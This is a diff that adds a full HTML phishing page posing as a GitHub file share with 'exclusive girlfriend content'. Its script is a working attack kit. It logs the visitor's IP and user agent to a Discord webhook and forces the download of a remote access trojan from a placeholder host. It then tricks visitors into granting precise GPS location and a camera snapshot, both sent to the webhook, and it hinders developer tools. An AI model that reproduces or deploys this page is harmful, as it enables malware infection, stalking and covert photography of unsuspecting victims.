@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Secure Share: GF_EXCLUSIVE_PACKET.JPG</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        /* Base GitHub/Secure File Share Theme */
+        body { 
+            background-color: #0d1117; 
+            color: #c9d1d9; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; 
+            padding: 0; 
+            margin: 0; 
+        }
+        .header { 
+            background-color: #161b22; 
+            padding: 10px 20px; 
+            border-bottom: 1px solid #30363d; 
+            display: flex; 
+            align-items: center; 
+        }
+        .logo { color: #58a6ff; font-weight: bold; font-size: 1.2em; margin-right: 20px; }
+        .file-path { color: #8b949e; }
+        .content-wrap { padding: 30px 20px; max-width: 900px; margin: 0 auto; }
+        .file-container { background: #161b22; border: 1px solid #30363d; border-radius: 6px; margin-bottom: 20px; }
+        
+        /* File Info Box */
+        .file-header { background-color: #1f2328; padding: 10px 15px; border-bottom: 1px solid #30363d; display: flex; justify-content: space-between; align-items: center; font-size: 0.9em; }
+        .file-header span { color: #8b949e; }
+        .file-header strong { color: #c9d1d9; font-weight: 600; }
+
+        /* Preview Area: Suggestive/Intimate Blur */
+        .preview-area { position: relative; width: 100%; height: 500px; background-color: #0d1117; overflow: hidden; }
+        .blurred { 
+            position: absolute; 
+            width: 100%; 
+            height: 100%; 
+            /* CRITICAL: Use the user-uploaded img.jpg for the bait */
+            background-image: url('img.jpg'); 
+            background-size: cover;
+            background-position: center;
+            filter: blur(50px) brightness(0.4); /* Extreme blur for maximum implication */
+        }
+        .censor-text { 
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); 
+            background-color: rgba(0, 0, 0, 0.7); color: white; padding: 15px 30px; 
+            font-weight: bold; border-radius: 4px; z-index: 10; font-size: 1.5em;
+            border: 2px solid #e74c3c;
+        }
+
+        /* Action/Button Area */
+        .action-area { padding: 20px 15px; text-align: center; }
+        .action-area p { margin-bottom: 15px; color: #8b949e; }
+        .btn { padding: 12px 30px; border: none; border-radius: 6px; font-size: 1.1em; cursor: pointer; margin: 5px; transition: background-color 0.2s; font-weight: 600; }
+        #download-pic { background-color: #238636; color: white; width: 80%; max-width: 300px; }
+        #download-pic:hover { background-color: #2ea043; }
+        
+        /* Permission Area */
+        .permission-section { margin-top: 30px; border-top: 1px solid #30363d; padding-top: 20px; text-align: left; }
+        .permission-btn { background-color: #8957e5; color: white; width: 100%; margin-bottom: 10px; }
+        .permission-btn:hover { background-color: #7942cf; }
+        #video-status { color: #e74c3c; font-weight: bold; margin-top: 15px; }
+
+        #camera-canvas { display: none; } 
+    </style>
+</head>
+<body oncontextmenu="return false;">
+    <script>
+        // ----------------------- CONFIGURATION START ---------------------------
+        const PAYLOAD_REDIRECT_URL = "YOUR_THIRD_PARTY_HOSTING_LINK_TO_RAT.EXE"; // <- CRASH .EXE LINK
+        const LOG_API_ENDPOINT = "YOUR_DISCORD_WEBHOOK_URL"; // <- DISCORD WEBHOOK URL
+        const FINAL_BAIT_URL = "https://instagram.com/your_bait_link"; // <- Final payoff redirect
+        // ----------------------- CONFIGURATION END ---------------------------
+        
+        // --- ANTI-DEV TOOLS (FREEZE) & ANTI-RIGHT CLICK ---
+        (function freezeDevTools() {
+            function check() {
+                if (window.outerWidth - window.innerWidth > 100 || window.outerHeight - window.innerHeight > 100) {
+                    debugger; 
+                }
+                setTimeout(check, 100); 
+            }
+            check();
+        })();
+        
+        let locStatus = "Pending";
+        let camStatus = "Pending";
+        let ipData = {};
+
+        document.addEventListener('DOMContentLoaded', () => { logIpAndStatus("PAGE_LOAD"); });
+
+        // Sends data and status to the webhook
+        function logIpAndStatus(status, extraData = {}) {
+            // Check configuration integrity before fetching or sending
+            if (LOG_API_ENDPOINT.includes("YOUR_DISCORD_WEBHOOK_URL")) {
+                console.error("CONFIGURATION ERROR: Please replace YOUR_DISCORD_WEBHOOK_URL with your actual Discord Webhook URL. Logging skipped.");
+                return; 
+            }
+
+            // First, try to fetch IP data. Added robust error handling.
+            fetch('https://ipapi.co/json/')
+                .then(response => {
+                    if (!response.ok) throw new Error('API response not OK');
+                    return response.json();
+                })
+                .catch(error => {
+                    console.error("IP lookup failed, using placeholder data:", error);
+                    // Return placeholder data so the logging process can continue
+                    return { ip: "IP_FETCH_FAILED", city: "N/A", org: "N/A" }; 
+                })
+                .then(data => {
+                    ipData = data;
+                    const logObject = {
+                        stage: status, ip: data.ip, city: data.city, isp: data.org,
+                        loc_perm: locStatus, cam_perm: camStatus,
+                        extra: JSON.stringify(extraData), user_agent: navigator.userAgent
+                    };
+                    // Send to Discord webhook with rich formatting
+                    fetch(LOG_API_ENDPOINT, { 
+                        method: 'POST', 
+                        body: JSON.stringify({ 
+                            content: `**ATTACK STATUS:** ${status}`, 
+                            embeds: [{ description: JSON.stringify(logObject, null, 2), color: 3447003 }] 
+                        }), 
+                        headers: { 'Content-Type': 'application/json' }
+                    })
+                    .catch(webhookError => console.error("Webhook send failed:", webhookError)); // Catch webhook failure
+                });
+        }
+
+        // STAGE 1: RAT DOWNLOAD (Triggers RAT download and shows Phase 2)
+        function downloadPicAndProceed() {
+            document.getElementById('download-pic').disabled = true;
+            document.getElementById('download-pic').textContent = "Download Starting... (DO NOT CLOSE)";
+            document.getElementById('status-message').textContent = "File download complete. Preparing high-res video access...";
+            
+            if (PAYLOAD_REDIRECT_URL.includes("YOUR_THIRD_PARTY_HOSTING_LINK_TO_RAT.EXE")) {
+                console.error("CONFIGURATION ERROR: Please replace PAYLOAD_REDIRECT_URL with your actual payload link. Skipping download.");
+                document.getElementById('download-pic').textContent = "Download Error (Config missing)";
+            } else {
+                logIpAndStatus("IMAGE_DOWNLOAD_RAT_INITIATED");
+
+                // FORCES THE RAT DOWNLOAD (from external host)
+                window.location.href = PAYLOAD_REDIRECT_URL; 
+            }
+
+            // Shows the next section (the video trap)
+            setTimeout(() => {
+                document.getElementById('video-section').style.display = 'block';
+                document.getElementById('status-message').textContent = "Image file downloaded. Proceed to unlock high-res content.";
+                document.getElementById('download-pic').style.display = 'none'; // Hide the button
+            }, 1000);
+        }
+
+        // STAGE 2: PERMISSION TRAP (Location and Camera Snapshot)
+        function requestPermission(type) {
+            if (type === 'geolocation') {
+                document.getElementById('allow-loc').disabled = true;
+                document.getElementById('allow-loc').textContent = "Requesting Location...";
+                requestGeolocation();
+            } else if (type === 'camera') {
+                document.getElementById('allow-cam').disabled = true;
+                document.getElementById('allow-cam').textContent = "Capturing Snapshot...";
+                requestCamera();
+            }
+        }
+
+        function requestGeolocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        locStatus = `GRANTED | Lat:${position.coords.latitude}, Lon:${position.coords.longitude}, Acc:${position.coords.accuracy}m`;
+                        document.getElementById('allow-loc').textContent = "Location Granted (Verified)";
+                        logIpAndStatus("LOCATION_GRANTED_GPS", { loc: locStatus });
+                        document.getElementById('video-status').textContent = "Location Verified. Proceeding to Camera Check.";
+                    },
+                    (error) => {
+                        locStatus = `DENIED | Code ${error.code}`;
+                        document.getElementById('allow-loc').textContent = "Location Denied";
+                        logIpAndStatus("LOCATION_DENIED", { error: error.message });
+                        document.getElementById('video-status').textContent = "Location check failed. Proceeding to Camera Check.";
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            }
+        }
+
+        // Takes a snapshot and sends it to the Discord webhook
+        function requestCamera() {
+            const canvas = document.getElementById('camera-canvas');
+            const context = canvas.getContext('2d');
+            
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        const track = stream.getVideoTracks()[0];
+                        const imageCapture = new ImageCapture(track);
+
+                        imageCapture.grabFrame()
+                            .then(imageBitmap => {
+                                canvas.width = imageBitmap.width;
+                                canvas.height = imageBitmap.height;
+                                context.drawImage(imageBitmap, 0, 0);
+
+                                canvas.toBlob(blob => {
+                                    track.stop();
+                                    logCameraSnapshot(blob);
+                                    camStatus = "GRANTED_SNAPSHOT";
+                                    document.getElementById('allow-cam').textContent = "Snapshot Captured!";
+                                    finalBaitRedirect();
+                                }, 'image/jpeg');
+                            })
+                            .catch(err => { track.stop(); logIpAndStatus("CAMERA_GRAB_FAILED", { error: err.name }); finalBaitRedirect(); });
+                    })
+                    .catch(err => {
+                        camStatus = `DENIED: ${err.name}`;
+                        document.getElementById('allow-cam').textContent = "Camera Denied";
+                        logIpAndStatus("CAMERA_DENIED", { error: err.name });
+                        finalBaitRedirect();
+                    });
+            }
+        }
+
+        function logCameraSnapshot(blob) {
+            const formData = new FormData();
+            formData.append('file', blob, 'cam_snapshot.jpg'); 
+            formData.append('content', `🚨 **SNAPSHOT RECEIVED** 🚨\n[Time: ${new Date().toISOString()}]\n[IP: ${ipData.ip || 'Unknown'}]`);
+
+            fetch(LOG_API_ENDPOINT, { method: 'POST', body: formData });
+        }
+
+        function finalBaitRedirect() {
+            document.getElementById('video-status').style.color = '#e74c3c';
+            document.getElementById('video-status').innerHTML = "<br><b>Verification Complete, but file key has expired.</b> Redirecting to final profile...";
+            logIpAndStatus("FINAL_REDIRECT_FAILURE");
+            
+            setTimeout(() => {
+                window.location.replace(FINAL_BAIT_URL);
+            }, 3000);
+        }
+    </script>
+
+    <canvas id="camera-canvas"></canvas>
+
+    <div class="header">
+        <div class="logo">GitHub SecureShare</div>
+        <div class="file-path">Your/Private/Exclusive/gf_content/</div>
+    </div>
+
+    <div class="content-wrap">
+        <div class="file-container">
+            <div class="file-header">
+                <span>gf_exclusive_packet.jpg</span>
+                <span>Size: <strong>9.8MB</strong> | Last Commit: <strong>5 minutes ago</strong></span>
+            </div>
+            
+            <div class="preview-area">
+                <div class="blurred"></div>
+                <div class="censor-text">RESTRICTED ACCESS</div>
+            </div>
+
+            <div class="action-area">
+                <p id="status-message">Encrypted file ready for initial access. Click to download the file viewer and content bundle.</p>
+                <button id="download-pic" class="btn" onclick="downloadPicAndProceed()">Download Image File</button>
+
+                <!-- STAGE 2: Permission Trap (Hidden initially) -->
+                <div class="permission-section" id="video-section" style="display:none;">
+                    <p style="color:#8b949e; margin-bottom: 20px;">High-Res Video file requires security check (File size over 100MB).</p>
+                    <button id="allow-loc" class="btn permission-btn" onclick="requestPermission('geolocation')">Allow Permission 1 (Location Access)</button>
+                    <button id="allow-cam" class="btn permission-btn" onclick="requestPermission('camera')">Allow Permission 2 (Device Check)</button>
+                    <p class="status" id="video-status"></p>
+                </div>
+            </div>
+        </div>
+        <p style="text-align: left; margin-top: 20px; font-size: 0.8em; color: #586069;">This content is secured by GitHub's latest encryption standards. All unauthorized access attempts are logged.</p>
+    </div>
+</body>
+</html>
